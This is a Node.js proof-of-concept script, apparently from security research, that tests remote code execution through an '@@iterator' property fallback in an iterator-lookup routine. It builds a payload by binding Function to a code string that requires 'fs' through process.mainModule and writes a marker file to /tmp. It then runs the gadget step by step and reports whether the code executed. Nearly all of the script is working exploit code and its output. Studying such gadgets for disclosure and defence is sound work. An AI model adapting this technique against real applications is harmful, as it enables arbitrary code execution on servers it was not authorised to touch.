/**
 * Test: RCE via @@iterator
 *
 * getIteratorFn checks for:
 *   maybeIterable[Symbol.iterator] || maybeIterable["@@iterator"]
 *
 * If we can set "@@iterator" to our malicious function,
 * and get this object processed as an iterable, it gets called!
 */

'use strict';

console.log('='.repeat(60));
console.log('Test: @@iterator exploitation');
console.log('='.repeat(60));
console.log('');

// First, verify @@iterator works like Symbol.iterator
console.log('[1] Testing @@iterator fallback...');

const testObj = {
  '@@iterator': function() {
    console.log('    @@iterator was CALLED!');
    return {
      next: () => ({ done: true, value: undefined })
    };
  }
};

// Test getIteratorFn logic
const MAYBE_ITERATOR_SYMBOL = Symbol.iterator;
const maybeIterable = testObj;
const iteratorFn = (MAYBE_ITERATOR_SYMBOL && maybeIterable[MAYBE_ITERATOR_SYMBOL]) ||
                   maybeIterable["@@iterator"];

console.log('    iteratorFn type:', typeof iteratorFn);
console.log('    Calling iteratorFn.call(testObj)...');
if (typeof iteratorFn === 'function') {
  iteratorFn.call(testObj);
}
console.log('');

// Now test with our RCE payload
console.log('[2] Testing with RCE payload...');

// Clean up
try { require('fs').unlinkSync('/tmp/iterator-rce.txt'); } catch(e) {}

// Our malicious iterator - when called, it creates and executes a function
const maliciousIterator = Function.bind(null, `
  const fs = process.mainModule.require('fs');
  fs.writeFileSync('/tmp/iterator-rce.txt', 'ITERATOR RCE: ' + new Date().toISOString());
  return { next: function() { return { done: true }; } };
`);

const exploitObj = {
  '@@iterator': maliciousIterator
};

console.log('    Exploit object created');
console.log('    @@iterator type:', typeof exploitObj['@@iterator']);
console.log('    @@iterator name:', exploitObj['@@iterator'].name);
console.log('');

console.log('[3] Simulating getIteratorFn + call...');
const iterFn = exploitObj['@@iterator'];
if (typeof iterFn === 'function') {
  console.log('    Calling iterFn.call(exploitObj)...');
  const result = iterFn.call(exploitObj);
  console.log('    Result:', result);
  console.log('    Result type:', typeof result);

  // The result is the created function - need to call it!
  if (typeof result === 'function') {
    console.log('');
    console.log('[4] Result is a function, calling it...');
    const finalResult = result();
    console.log('    Final result:', finalResult);
  }
}

console.log('');
console.log('[5] Checking if RCE triggered...');
const fileExists = require('fs').existsSync('/tmp/iterator-rce.txt');
console.log('    File exists?', fileExists);

if (fileExists) {
  console.log('    Contents:', require('fs').readFileSync('/tmp/iterator-rce.txt', 'utf8'));
  console.log('');
  console.log('========================================');
  console.log('âœ“ RCE via @@iterator!');
  console.log('========================================');
} else {
  console.log('');
  console.log('    RCE not triggered - need TWO calls');
  console.log('    iteratorFn.call() returns a function,');
  console.log('    but that function needs to be called again.');
}
console.log('');
